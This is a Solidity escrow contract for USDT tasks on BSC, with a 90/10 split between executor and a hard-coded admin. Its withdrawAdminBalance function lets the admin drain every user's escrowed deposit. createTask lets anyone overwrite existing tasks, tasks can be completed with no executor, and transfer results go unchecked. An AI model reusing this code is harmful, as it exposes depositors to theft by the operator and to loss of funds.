// SPDX-License-Identifier: MIT
// Pulse Escrow Contract - BSC BEP20
// Admin: 0xa657fb7e405534d0b9d07b5edf413fddc3922128

pragma solidity ^0.8.19;

interface IBEP20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract PulseEscrow {
    address public admin;
    IBEP20 public usdtToken;
    
    struct Task {
        address creator;
        address executor;
        uint256 amount;
        bool isActive;
        bool isCompleted;
    }
    
    mapping(bytes32 => Task) public tasks;
    
    event TaskCreated(bytes32 indexed taskId, address creator, uint256 amount);
    event TaskCompleted(bytes32 indexed taskId, address executor, uint256 executorAmount, uint256 adminAmount);
    event TaskRefunded(bytes32 indexed taskId, address creator, uint256 amount);
    
    constructor(address _usdtAddress) {
        admin = msg.sender;
        usdtToken = IBEP20(_usdtAddress);
    }
    
    function createTask(bytes32 taskId, uint256 amount) external {
        require(amount > 0, "Amount must be > 0");
        require(usdtToken.transferFrom(msg.sender, address(this), amount), "Transfer failed");
        
        tasks[taskId] = Task({
            creator: msg.sender,
            executor: address(0),
            amount: amount,
            isActive: true,
            isCompleted: false
        });
        
        emit TaskCreated(taskId, msg.sender, amount);
    }
    
    function assignExecutor(bytes32 taskId, address executor) external {
        require(tasks[taskId].isActive, "Task not active");
        require(tasks[taskId].creator == msg.sender, "Only creator");
        require(executor != address(0), "Invalid executor");
        
        tasks[taskId].executor = executor;
    }
    
    function completeTask(bytes32 taskId) external {
        require(tasks[taskId].isActive, "Task not active");
        require(
            tasks[taskId].creator == msg.sender || tasks[taskId].executor == msg.sender,
            "Only creator or executor"
        );
        
        Task storage task = tasks[taskId];
        uint256 adminFee = (task.amount * 10) / 100; // 10%
        uint256 executorAmount = task.amount - adminFee; // 90%
        
        task.isActive = false;
        task.isCompleted = true;
        
        // Transfer 90% to executor
        usdtToken.transfer(task.executor, executorAmount);
        
        // Transfer 10% to admin
        usdtToken.transfer(admin, adminFee);
        
        emit TaskCompleted(taskId, task.executor, executorAmount, adminFee);
    }
    
    function refundTask(bytes32 taskId) external {
        require(tasks[taskId].isActive, "Task not active");
        require(tasks[taskId].creator == msg.sender, "Only creator");
        require(tasks[taskId].executor == address(0), "Executor already assigned");
        
        Task storage task = tasks[taskId];
        uint256 amount = task.amount;
        
        task.isActive = false;
        
        usdtToken.transfer(task.creator, amount);
        
        emit TaskRefunded(taskId, task.creator, amount);
    }
    
    function getTask(bytes32 taskId) external view returns (
        address creator,
        address executor,
        uint256 amount,
        bool isActive,
        bool isCompleted
    ) {
        Task memory task = tasks[taskId];
        return (task.creator, task.executor, task.amount, task.isActive, task.isCompleted);
    }
    
    function withdrawAdminBalance() external {
        require(msg.sender == admin, "Only admin");
        usdtToken.transfer(admin, usdtToken.balanceOf(address(this)));
    }
}
